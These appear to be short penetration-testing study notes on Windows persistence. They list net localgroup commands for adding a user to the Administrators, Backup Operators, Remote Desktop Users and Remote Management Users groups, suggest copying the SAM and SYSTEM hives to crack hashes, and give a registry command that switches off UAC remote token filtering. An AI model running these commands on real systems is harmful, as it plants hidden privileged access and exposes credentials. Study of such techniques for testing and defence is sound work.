# Windows Persistence

## Assign Group Memberships

### Add to Administrators group
Most straight forward way, but could be suspicious.

`C:\> net localgroup administrators <username> /add`

### Add to Backup Operators
Backup Operators have read/write for any file or registry key on the system and ignores any configured DACL.

Can use this to copy SAM and SYSTEM registry hives to crack hashes offline.

`C:\> net localgroup "Backup Operators" <username> /add`

Downside is that this account is unprivileged and cannot RDP or WinRM to the machine. We can add it to the **Remote Desktop Users** for RDP or **Remote Management Users** for WinRM

`C:\> net localgroup "Remote Desktop Users" <username> /add`

`C:\> net localgroup "Remote Management Users" <username> /add`

### Potential Fences
Due to UAC (User Account Control) admin rights may be stripped upon remote connection. This is due to the LocalAccountTokenFilterPolicy registry value. We can change that using the following command:

`C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1`

Where `/t` is the datatype, `/v` is the valuename, and `/d` is the data.